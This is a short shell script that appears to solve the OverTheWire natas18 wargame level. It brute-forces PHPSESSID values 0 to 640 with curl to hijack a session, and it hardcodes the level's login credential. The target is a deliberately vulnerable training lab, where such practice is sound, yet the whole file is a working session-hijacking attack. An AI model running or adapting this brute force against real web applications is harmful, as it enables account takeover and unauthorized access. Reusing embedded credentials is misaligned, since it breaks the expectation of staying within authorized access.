#! env sh

for i in `seq 0 640`
do
    echo "PHPSESSID == $i: "
    curl http://natas18.natas.labs.overthewire.org --user "natas18:8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq" --cookie "PHPSESSID=$i"
done

